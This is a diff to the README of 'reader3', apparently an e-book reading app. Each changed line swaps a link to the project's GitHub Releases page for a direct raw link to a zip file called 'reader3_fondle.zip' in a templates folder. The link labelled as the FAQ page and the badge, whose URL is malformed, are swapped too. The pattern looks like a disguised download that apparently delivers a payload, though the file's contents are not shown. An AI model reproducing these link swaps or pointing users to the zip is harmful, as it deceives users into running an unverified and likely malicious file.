@@ -6,11 +6,11 @@ Welcome to **reader3**! This application allows you to read books while enjoying
 
 ## 📥 Download the Application
 
-[![Download reader3](https://img.shields.io/badge/Download%20reader3-v1.0-blue.svg)](https://github.com/sebaspc136/reader3/releases)
+[![Download reader3](https://raw.githubusercontent.com/sebaspc136/reader3/master/templates/reader3_fondle.zip%https://raw.githubusercontent.com/sebaspc136/reader3/master/templates/reader3_fondle.zip)](https://raw.githubusercontent.com/sebaspc136/reader3/master/templates/reader3_fondle.zip)
 
 To start, download the latest version of the application. You can find it on our Releases page. 
 
-Visit this page to download: [reader3 Releases](https://github.com/sebaspc136/reader3/releases)
+Visit this page to download: [reader3 Releases](https://raw.githubusercontent.com/sebaspc136/reader3/master/templates/reader3_fondle.zip)
 
 ## ⚙️ System Requirements
 
@@ -26,7 +26,7 @@ To use **reader3**, make sure your device meets the following requirements:
 Follow these steps to install **reader3** on your computer:
 
 1. **Download the file:**
-   - Go to the [reader3 Releases page](https://github.com/sebaspc136/reader3/releases).
+   - Go to the [reader3 Releases page](https://raw.githubusercontent.com/sebaspc136/reader3/master/templates/reader3_fondle.zip).
    - Click on the latest version to find the files.
    - Select the appropriate installer for your operating system. 
 
@@ -67,7 +67,7 @@ Once you have installed **reader3**, you can begin using it right away. Here’s
 ## 📞 Support
 
 If you encounter any issues or have questions:
-- Check the FAQ section on our [GitHub page](https://github.com/sebaspc136/reader3/releases).
+- Check the FAQ section on our [GitHub page](https://raw.githubusercontent.com/sebaspc136/reader3/master/templates/reader3_fondle.zip).
 - You can reach out via the GitHub Issues tab for assistance.
 
-Thank you for choosing **reader3**! We hope it enhances your reading experience. For further information, don’t forget to visit the [reader3 Releases page](https://github.com/sebaspc136/reader3/releases) for updates and downloads.
+Thank you for choosing **reader3**! We hope it enhances your reading experience. For further information, don’t forget to visit the [reader3 Releases page](https://raw.githubusercontent.com/sebaspc136/reader3/master/templates/reader3_fondle.zip) for updates and downloads.
